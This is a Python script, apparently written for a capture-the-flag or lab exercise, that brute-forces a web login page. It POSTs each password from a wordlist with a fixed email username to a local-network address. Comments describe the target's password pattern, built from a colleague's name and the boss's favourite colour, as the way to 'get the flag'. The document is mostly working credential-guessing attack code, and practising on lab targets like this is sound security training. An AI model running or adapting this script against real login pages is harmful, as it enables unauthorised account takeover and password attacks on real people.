#!/usr/bin/python3

import requests

url = 'http://192.168.87.68:8080/login-3/'
login = open("logins.txt").read().splitlines()
passwords = open("passwords.txt").read().splitlines()

for i in passwords:
        info = {'username': 'dvaliant@bedlamdynamics.com', 'password': (i)}
        print(info)
        print(i)
        post = requests.post(url, data = info)
        #print(post.status_code)
        print(post.text)


# Username: dvaliant@bedlamdynamics.com
# Need to create password list still. 
#The valid account's password is their favorite colleague's first name and their boss's 
#favorite color twice in a row. For example, if their best friend is Jacob 
#and their boss is Carly, then the password is JacobOrangeJacobOrange. 
#Use this knowledge to authenticate to the website to get the flag. 
